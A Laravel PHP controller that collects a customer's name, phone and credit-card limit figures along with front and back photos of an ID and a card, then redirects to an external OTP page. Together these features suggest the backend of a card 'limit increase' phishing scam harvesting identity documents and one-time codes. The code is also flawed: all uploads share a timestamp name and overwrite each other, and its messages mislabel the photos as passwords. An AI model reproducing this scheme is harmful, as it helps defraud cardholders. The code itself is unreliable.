<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Customer;

class CustomerController extends Controller
{
    public function save(Request $request)
    {
        // dd($request->all());
        $request->validate([
            'name' => 'required',
            'phone' => 'required',
            'limit_now' => 'required',
            'limit_total' => 'required',
            'limit_increase' => 'required',
            'mattruoc' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
            'matsau' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
            'mattruoc_card' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
            'matsau_card' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ], [
            'name.required' => 'Vui lòng nhập tên khách hàng',
            'phone.required' => 'Vui lòng nhập số điện thoại',
            'limit_now.required' => 'Vui lòng nhập giới hạn hiện tại',
            'limit_total.required' => 'Vui lòng nhập giới hạn tối đa',
            'limit_increase.required' => 'Vui lòng nhập giới hạn tăng',
            'mattruoc.required' => 'Vui lòng nhập mật khẩu trước',
            'matsau.required' => 'Vui lòng nhập mật khẩu sau',
            'mattruoc_card.required' => 'Vui lòng nhập mật khẩu trước thẻ',
            'matsau_card.required' => 'Vui lòng nhập mật khẩu sau thẻ',
            'mattruoc.image' => 'Mật khẩu trước không đúng định dạng',
            'matsau.image' => 'Mật khẩu sau không đúng định dạng',
            'mattruoc_card.image' => 'Mật khẩu trước thẻ không đúng định dạng',
            'matsau_card.image' => 'Mật khẩu sau thẻ không đúng định dạng',
            'mattruoc.mimes' => 'Mật khẩu trước không đúng định dạng',
            'matsau.mimes' => 'Mật khẩu sau không đúng định dạng',
            'mattruoc_card.mimes' => 'Mật khẩu trước thẻ không đúng định dạng',
            'matsau_card.mimes' => 'Mật khẩu sau thẻ không đúng định dạng',
            'mattruoc.max' => 'Mật khẩu trước không quá 2MB',
            'matsau.max' => 'Mật khẩu sau không quá 2MB',
            'mattruoc_card.max' => 'Mật khẩu trước thẻ không quá 2MB',
            'matsau_card.max' => 'Mật khẩu sau thẻ không quá 2MB',
        ]);

        // save image to storage
        $mattruoc = $request->file('mattruoc');
        $mattruoc_name = time() . '.' . $mattruoc->extension();
        $mattruoc->storeAs('public', $mattruoc_name);

        $matsau = $request->file('matsau');
        $matsau_name = time() . '.' . $matsau->extension();
        $matsau->storeAs('public', $matsau_name);


        $mattruoc_card = $request->file('mattruoc_card');
        $mattruoc_card_name = time() . '.' . $mattruoc_card->extension();
        $mattruoc_card->storeAs('public', $mattruoc_card_name);

        $matsau_card = $request->file('matsau_card');
        $matsau_card_name = time() . '.' . $matsau_card->extension();
        $matsau_card->storeAs('public', $matsau_card_name);

        // save to database
        $customer = new Customer();
        $customer->name = $request->name;
        $customer->phone = $request->phone;
        $customer->limit_now = $request->limit_now;
        $customer->limit_total = $request->limit_total;
        $customer->limit_increase = $request->limit_increase;
        $customer->mattruoc = $mattruoc_name;
        $customer->matsau = $matsau_name;
        $customer->mattruoc_card = $mattruoc_card_name;
        $customer->matsau_card = $matsau_card_name;
        $customer->save();

        return redirect(env('FRONTEND_URL') . '/otp.html');
    }
}
